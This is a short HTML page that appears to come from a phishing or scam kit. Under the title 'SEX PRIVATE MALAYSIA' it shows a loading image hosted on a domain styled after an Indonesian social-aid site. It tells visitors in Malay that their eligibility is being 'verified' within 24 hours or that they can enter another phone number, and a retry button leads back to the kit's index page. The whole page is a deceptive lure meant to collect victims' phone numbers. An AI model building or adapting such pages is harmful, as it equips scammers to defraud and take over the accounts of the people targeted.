<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEX PRIVATE MALAYSIA</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: auto;
        }
        .loading-img {
            width: 150px;
            margin: 20px auto;
        }
        .message {
            font-size: 16px;
            margin: 20px 0;
        }
        .retry-btn {
            background-color: #6c4f4f;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        .retry-btn:hover {
            background-color: #5a3d3d;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>SEX PRIVATE MALAYSIA</h2>
        <img src="https://mybansospkh-info2025.biz.id/assets/masterweb/processing.gif" alt="Processing" class="loading-img">
        <p class="message">
            Sila tunggu proses pengesahan dalam masa 1x24 jam untuk mengesahkan kelayakan, <br>
            atau gunakan nombor telefon lain.
        </p>
        <button class="retry-btn" onclick="window.location.href='../index.php'">« Cuba lagi</button>
    </div>

</body>
</html>
